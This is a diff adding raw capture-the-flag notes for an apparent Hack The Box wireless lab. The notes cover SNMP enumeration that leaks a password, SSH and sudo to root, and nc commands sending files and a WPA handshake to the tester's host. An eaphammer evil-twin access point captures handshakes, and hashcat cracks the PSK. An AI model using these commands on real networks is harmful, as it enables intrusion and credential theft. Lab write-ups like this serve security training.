@@ -1,0 +1,298 @@
+└─$ nmap   -sSCV 10.129.244.98  --min-rate 999    
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-27 17:06 +1100
+Nmap scan report for 10.129.244.98
+Host is up (0.17s latency).
+Not shown: 999 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+
+└─$ nmap  -sU 10.129.244.98  --min-rate 999   
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-27 17:06 +1100
+Nmap scan report for 10.129.244.98
+Host is up (0.11s latency).
+Not shown: 991 open|filtered udp ports (no-response)
+PORT      STATE  SERVICE
+3/udp     closed compressnet
+161/udp   open   snmp
+
+└─$ nmap -sC -sV -A -sU -p 161 --min-rate 3000 -oN udp_result.txt 10.129.244.98
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-27 17:37 +1100
+Nmap scan report for 10.129.244.98
+Host is up (0.12s latency).
+
+PORT    STATE SERVICE VERSION
+161/udp open  snmp    SNMPv1 server; net-snmp SNMPv3 server (public)
+| snmp-sysdescr: "The default consultant password is: RxBlZhLmOkacNWScmZ6D (change it after use it)"
+|_  System uptime: 41m50.87s (251087 timeticks)
+| snmp-info: 
+|   enterprise: net-snmp
+|   engineIDFormat: unknown
+|   engineIDData: 2fa52975f81bc66900000000
+|   snmpEngineBoots: 1
+|_  snmpEngineTime: 41m51s
+Too many fingerprints match this host to give specific OS details
+Network Distance: 2 hops
+Service Info: Host: Consultant
+
+TRACEROUTE (using port 161/udp)
+HOP RTT      ADDRESS
+1   85.61 ms 10.10.16.1
+2   81.80 ms 10.129.244.98
+
+
+└─$ snmpwalk -v2c -c public 10.129.244.98
+iso.3.6.1.2.1.1.1.0 = STRING: "\"The default consultant password is: RxBlZhLmOkacNWScmZ6D (change it after use it)\""
+iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
+iso.3.6.1.2.1.1.3.0 = Timeticks: (94058) 0:15:40.58
+iso.3.6.1.2.1.1.4.0 = STRING: "admin@AirTouch.htb"
+iso.3.6.1.2.1.1.5.0 = STRING: "Consultant"
+iso.3.6.1.2.1.1.6.0 = STRING: "\"Consultant pc\""
+iso.3.6.1.2.1.1.8.0 = Timeticks: (0) 0:00:00.00
+
+└─$ ssh consultant@10.129.244.98
+consultant@AirTouch-Consultant:~$ id
+uid=1000(consultant) gid=1000(consultant) groups=1000(consultant)
+
+consultant@AirTouch-Consultant:~$ sudo -l
+Matching Defaults entries for consultant on AirTouch-Consultant:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+consultant@AirTouch-Consultant:~$ ls -la
+total 888
+drwxr-xr-x 1 consultant consultant   4096 Mar 27 06:17 .
+drwxr-xr-x 1 root       root         4096 Jan 13 14:55 ..
+lrwxrwxrwx 1 consultant consultant      9 Mar 27  2024 .bash_history -> /dev/null
+-rw-r--r-- 1 consultant consultant    220 Feb 25  2020 .bash_logout
+-rw-r--r-- 1 consultant consultant   3771 Feb 25  2020 .bashrc
+drwx------ 2 consultant consultant   4096 Mar 27 06:17 .cache
+-rw-r--r-- 1 consultant consultant    807 Feb 25  2020 .profile
+-rw-r--r-- 1 consultant consultant 131841 Mar 27  2024 diagram-net.png
+-rw-r--r-- 1 consultant consultant 743523 Mar 27  2024 photo_2023-03-01_22-04-52.png
+
+consultant@AirTouch-Consultant:~$ nc 10.10.16.120 8821 < photo_2023-03-01_22-04-52.png 
+consultant@AirTouch-Consultant:~$ nc 10.10.16.120 8821 < photo_2023-03-01_22-04-52.png 
+
+User consultant may run the following commands on AirTouch-Consultant:
+    (ALL) NOPASSWD: ALL
+
+consultant@AirTouch-Consultant:~$ sudo su
+root@AirTouch-Consultant:/home/consultant# id
+uid=0(root) gid=0(root) groups=0(root)
+
+root@AirTouch-Consultant:/# ls -la
+total 72
+drwxr-xr-x   1 root root 4096 Mar 27 05:56 .
+drwxr-xr-x   1 root root 4096 Mar 27 05:56 ..
+-rwxr-xr-x   1 root root    0 Mar 27 05:56 .dockerenv
+
+root@AirTouch-Consultant:~# ls
+eaphammer
+
+APHammer is a specialized penetration testing toolkit designed for targeted evil twin attacks against WPA2-Enterprise Wi-Fi networks
+
+
+wpa_cli requires a specific line in your /etc/wpa_supplicant/wpa_supplicant.conf to create the communication socket. 
+
+
+sudo nano /etc/wpa_supplicant/wpa_supplicant.conf
+
+ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdev
+update_config=1
+
+
+root@AirTouch-Consultant:~/eaphammer# sudo wpa_supplicant -B -i wlan0 -c /etc/wpa_supplicant/wpa_supplicant.conf
+Successfully initialized wpa_supplicant
+rfkill: Cannot open RFKILL control device
+rfkill: Cannot get wiphy information
+
+root@AirTouch-Consultant:~/eaphammer# sudo wpa_supplicant -B -i wlan0 -c /etc/wpa_supplicant/wpa_supplicant.conf
+Successfully initialized wpa_supplicant
+rfkill: Cannot open RFKILL control device
+rfkill: Cannot get wiphy information
+root@AirTouch-Consultant:~/eaphammer# wpa_cli -i wlan0
+wpa_cli v2.9
+Copyright (c) 2004-2019, Jouni Malinen <j@w1.fi> and contributors
+
+This software may be distributed under the terms of the BSD license.
+See README for more details.
+
+
+
+Interactive mode
+
+> scan
+OK
+<3>CTRL-EVENT-SCAN-STARTED 
+<3>CTRL-EVENT-SCAN-RESULTS 
+<3>CTRL-EVENT-NETWORK-NOT-FOUND 
+> scan_result
+bssid / frequency / signal level / flags / ssid
+ac:8b:a9:aa:3f:d2	5220	-30	[WPA2-EAP-CCMP][ESS]	AirTouch-Office
+ac:8b:a9:f3:a1:13	5220	-30	[WPA2-EAP-CCMP][ESS]	AirTouch-Office
+aa:40:63:17:fe:02	2412	-30	[WPA2-PSK-TKIP][ESS]	vodafoneFB6N
+8e:9b:4b:07:e6:35	2422	-30	[WPA2-PSK-CCMP+TKIP][ESS]	MOVISTAR_FG68
+f0:9f:c2:a3:f1:a7	2437	-30	[WPA2-PSK-CCMP+TKIP][ESS]	AirTouch-Internet
+f6:b4:dd:bf:3f:ec	2437	-30	[WPA2-PSK-CCMP+TKIP][ESS]	WIFI-JOHN
+8e:7a:77:89:9b:e5	2452	-30	[WPA2-PSK-CCMP][ESS]	MiFibra-24-D4VY
+
+As the png files revailed, AirTouch-Office and AirTouch-Internet are two vlans in this network.
+
+run eaphammer on airTouch-office, the first access point.
+
+https://en.wikipedia.org/wiki/List_of_WLAN_channels#2.4_GHz_(802.11b/g/n/ax/be)  , check the channel of a frequncy.
+
+root@AirTouch-Consultant:~/eaphammer# ./eaphammer --bssid AC:8B:A9:AA:3F:D2 --essid AirTouch-Office --channel 50 --interface wlan0 --auth wpa-eap --creds
+
+                     .__                                         
+  ____ _____  ______ |  |__ _____    _____   _____   ___________ 
+_/ __ \\__  \ \____ \|  |  \\__  \  /     \ /     \_/ __ \_  __ \
+\  ___/ / __ \|  |_> >   Y  \/ __ \|  Y Y  \  Y Y  \  ___/|  | \/
+ \___  >____  /   __/|___|  (____  /__|_|  /__|_|  /\___  >__|   
+     \/     \/|__|        \/     \/      \/      \/     \/       
+
+
+                        Now with more fast travel than a next-gen Bethesda game. >:D
+
+                             Version:  1.14.0
+                            Codename:  Final Frontier
+                              Author:  @s0lst1c3
+                             Contact:  gabriel<<at>>transmitengage.com
+
+    
+[?] Am I root?
+[*] Checking for rootness...
+[*] I AM ROOOOOOOOOOOOT
+[*] Root privs confirmed! 8D
+[*] Saving current iptables configuration...
+[*] Reticulating radio frequency splines...
+Error: Could not create NMClient object: Could not connect: No such file or directory.
+
+[*] Using nmcli to tell NetworkManager not to manage wlan0...
+
+100%|███████████████████████████████████████████████████████████████████████████| 1/1 [00:01<00:00,  1.01s/it]
+
+[*] Success: wlan0 no longer controlled by NetworkManager.
+[!] The hw_mode specified in hostapd.ini is invalid for the selected channel (g, 50)
+[!] Falling back to hw_mode: a
+[*] WPA handshakes will be saved to /root/eaphammer/loot/wpa_handshake_capture-2026-03-27-07-41-59-mk0Mmpf7FRxTqT7jW1tagnVKJ4IjpKBu.hccapx
+Configuration file: /root/eaphammer/tmp/hostapd-2026-03-27-07-41-59-OzYg0MLbc0xxeHMUP1zzvgIZxaDPLUxb.conf
+
+[hostapd] AP starting...
+
+rfkill: Cannot open RFKILL control device
+wlan0: interface state UNINITIALIZED->COUNTRY_UPDATE
+wlan0: IEEE 802.11 Configured channel (50) not found from the channel list of current mode (2) IEEE 802.11a
+wlan0: IEEE 802.11 Hardware does not support configured channel
+Could not select hw_mode and channel. (-3)
+wlan0: interface state COUNTRY_UPDATE->DISABLED
+wlan0: AP-DISABLED 
+wlan0: interface state DISABLED->DISABLED
+wlan0: AP-DISABLED 
+wlan0: CTRL-EVENT-TERMINATING 
+hostapd_free_hapd_data: Interface wlan0 wasn't started
+nl80211: deinit ifname=wlan0 disabled_11b_rates=0
+
+
+the channel not supported. try 42,46,50, all did no work.
+
+try to auth to airTouch-Internet. 
+root@AirTouch-Consultant:~/eaphammer# ./eaphammer --bssid F0:9F:C2:A3:F1:A7 --essid AirTouch-Internet --channel 6 --interface wlan0 --auth wpa-psk --creds
+
+                     .__                                         
+  ____ _____  ______ |  |__ _____    _____   _____   ___________ 
+_/ __ \\__  \ \____ \|  |  \\__  \  /     \ /     \_/ __ \_  __ \
+\  ___/ / __ \|  |_> >   Y  \/ __ \|  Y Y  \  Y Y  \  ___/|  | \/
+ \___  >____  /   __/|___|  (____  /__|_|  /__|_|  /\___  >__|   
+     \/     \/|__|        \/     \/      \/      \/     \/       
+
+
+                        Now with more fast travel than a next-gen Bethesda game. >:D
+
+                             Version:  1.14.0
+                            Codename:  Final Frontier
+                              Author:  @s0lst1c3
+                             Contact:  gabriel<<at>>transmitengage.com
+
+    
+[?] Am I root?
+[*] Checking for rootness...
+[*] I AM ROOOOOOOOOOOOT
+[*] Root privs confirmed! 8D
+[*] Saving current iptables configuration...
+[*] Reticulating radio frequency splines...
+Error: Could not create NMClient object: Could not connect: No such file or directory.
+
+[*] Using nmcli to tell NetworkManager not to manage wlan0...
+
+100%|███████████████████████████████████████████████████████████████████████████| 1/1 [00:01<00:00,  1.00s/it]
+
+[*] Success: wlan0 no longer controlled by NetworkManager.
+[*] WPA handshakes will be saved to /root/eaphammer/loot/wpa_handshake_capture-2026-03-27-07-36-29-y8jjcd6UBbbMawhyJUgcCkoQVhoHOUzM.hccapx
+
+[hostapd] AP starting...
+
+Configuration file: /root/eaphammer/tmp/hostapd-2026-03-27-07-36-29-tWXYY0K6xc6wnzc6f8cd2XYyQ2SUhi6k.conf
+rfkill: Cannot open RFKILL control device
+wlan0: interface state UNINITIALIZED->COUNTRY_UPDATE
+Using interface wlan0 with hwaddr f0:9f:c2:a3:f1:a7 and ssid "AirTouch-Internet"
+wlan0: interface state COUNTRY_UPDATE->ENABLED
+wlan0: AP-ENABLED 
+
+
+Press enter to quit...
+
+wlan0: STA 28:6c:07:fe:a3:22 IEEE 802.11: authenticated
+wlan0: STA 28:6c:07:fe:a3:22 IEEE 802.11: associated (aid 1)
+[EAPHAMMER] Captured a WPA/2 handshake from: 28:6c:07:fe:a3:22
+wlan0: AP-STA-POSSIBLE-PSK-MISMATCH 28:6c:07:fe:a3:22
+[EAPHAMMER] Captured a WPA/2 handshake from: 28:6c:07:fe:a3:22
+[EAPHAMMER] Captured a WPA/2 handshake from: 28:6c:07:fe:a3:22
+wlan0: AP-STA-POSSIBLE-PSK-MISMATCH 28:6c:07:fe:a3:22
+[EAPHAMMER] Captured a WPA/2 handshake from: 28:6c:07:fe:a3:22
+[EAPHAMMER] Captured a WPA/2 handshake from: 28:6c:07:fe:a3:22
+wlan0: AP-STA-POSSIBLE-PSK-MISMATCH 28:6c:07:fe:a3:22
+[EAPHAMMER] Captured a WPA/2 handshake from: 28:6c:07:fe:a3:22
+[EAPHAMMER] Captured a WPA/2 handshake from: 28:6c:07:fe:a3:22
+wlan0: AP-STA-POSSIBLE-PSK-MISMATCH 28:6c:07:fe:a3:22
+[EAPHAMMER] Captured a WPA/2 handshake from: 28:6c:07:fe:a3:22
+wlan0: STA 28:6c:07:fe:a3:22 IEEE 802.11: deauthenticated due to local deauth request
+wlan0: STA 28:6c:07:fe:a3:22 IEEE 802.11: authenticated
+wlan0: STA 28:6c:07:fe:a3:22 IEEE 802.11: associated (aid 1)
+
+
+[*] WPA handshakes will be saved to /root/eaphammer/loot/wpa_handshake_capture-2026-03-27-07-36-29-y8jjcd6UBbbMawhyJUgcCkoQVhoHOUzM.hccapx
+
+.hccapx file is a hash capture format used by Hashcat (a password-cracking tool) to store WPA/WPA2 handshake data.
+
+root@AirTouch-Consultant:~/eaphammer/loot# nc 10.10.16.120 8821 < wpa_handshake_capture-2026-03-27-07-36-29-y8jjcd6UBbbMawhyJUgcCkoQVhoHOUzM.hccapx 
+a
+└─$ ./hccapx2cap /tmp/air/inter.hccapx /tmp/air/inter.cap
+
+
+hcxpcapngtool 7.1.0 (C) 2026 ZeroBeat
+convert pcapng, pcap and cap files to hash formats that hashcat and JtR use
+
+└─$ hashcat -m 22000 inter.hc22000 ~/tools/rockyou.txt 
+hashcat (v7.1.2) starting
+
+2418a9fed2b308e2ab48edef94e33939:f09fc2a3f1a7:286c07fea322:AirTouch-Internet:challenge
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+
+
+root@AirTouch-Consultant:~/eaphammer/loot# wpa_cli -i wlan0 add_network
+0
+root@AirTouch-Consultant:~/eaphammer/loot# wpa_cli -i wlan0 set_network 0 ssid '"AirTouch-Internet"'
+OK
+root@AirTouch-Consultant:~/eaphammer/loot# wpa_cli -i wlan0 set_network 0 psk '"challenge"'
+OK
+root@AirTouch-Consultant:~/eaphammer/loot# wpa_cli -i wlan0 select_network 0
+OK
+root@AirTouch-Consultant:~/eaphammer/loot# wpa_cli -i wlan0 status
+wpa_state=SCANNING
+p2p_device_address=42:00:00:00:00:00
+address=f0:9f:c2:a3:f1:a7
+uuid=362db47b-a53a-5191-88fb-5458b986b2e4
+
+root@AirTouch-Consultant:~/eaphammer/loot# dhclient wlan0
